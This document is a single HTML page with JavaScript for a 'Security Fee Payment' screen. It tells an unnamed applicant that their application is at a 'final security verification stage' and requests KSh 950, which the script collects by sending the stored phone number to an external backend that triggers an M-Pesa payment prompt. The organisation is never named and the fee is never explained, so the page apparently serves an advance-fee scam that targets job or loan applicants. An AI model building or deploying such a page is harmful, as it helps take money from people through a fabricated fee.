<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Security Fee Payment</title>

<style>

body{
    margin:0;
    padding:15px;
    background:#0b6b0b;
    font-family:Arial,sans-serif;
}

.container{
    max-width:420px;
    margin:auto;
}

.card{
    background:white;
    padding:25px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 5px 15px rgba(0,0,0,.2);
}

.logo{
    width:90px;
}

h2{
    color:#0b6b0b;
}

.box{
    background:#f1f8e9;
    padding:15px;
    border-radius:10px;
    margin-top:20px;
}

.amount{
    font-size:28px;
    font-weight:bold;
    color:#0b6b0b;
    margin:20px;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:8px;
    background:#0b6b0b;
    color:white;
    font-size:17px;
}

</style>

</head>


<body>

<div class="container">

<div class="card">

<img src="logo.png" class="logo">

<h2>Security Fee Payment</h2>

<p id="name">Applicant</p>


<div class="box">

<p>Your application has reached the final security verification stage.</p>

<p>Please complete the security fee payment to proceed.</p>

</div>


<div class="amount">
KSh 950
</div>


<p>Payment Status: Pending</p>


<button onclick="paySecurity()">
Pay KSh 950
</button>


</div>

</div>


<script>
let btn = document.querySelector("button");

let applicant = localStorage.getItem("applicantName");

document.getElementById("name").innerHTML =
"Dear " + (applicant || "Applicant");


async function paySecurity(){

btn.disabled=true;
btn.innerHTML="Sending STK Push...";

let phone = localStorage.getItem("phoneNumber");

if(!phone){

alert("Phone number not found");
btn.disabled=false;
btn.innerHTML="Pay KSh 950";
return;

}


try{

let response = await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone:phone,
amount:950
})
});


let data = await response.json();

console.log(data);


if(!data.success){

alert(data.message || "Payment failed");

btn.disabled=false;
btn.innerHTML="Pay KSh 950";

return;

}


if(data.status=="completed"){

window.location.href="status.html";
return;

}


if(data.status=="pending"){

btn.innerHTML="Waiting for payment...";


let checkout = data.checkout_request_id;


let timer=setInterval(async()=>{


let res = await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/payment-status",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
checkout_request_id:checkout
})
});


let status = await res.json();

console.log(status);


if(status.status=="completed"){

clearInterval(timer);

window.location.href="status.html";

}


if(status.status=="failed"){

clearInterval(timer);

alert("Payment failed");

btn.disabled=false;
btn.innerHTML="Pay KSh 950";

}


},3000);

}


}catch(error){

console.log(error);

alert("Payment request failed");

btn.disabled=false;
btn.innerHTML="Pay KSh 950";

}

    }


</script>


</body>

</html>
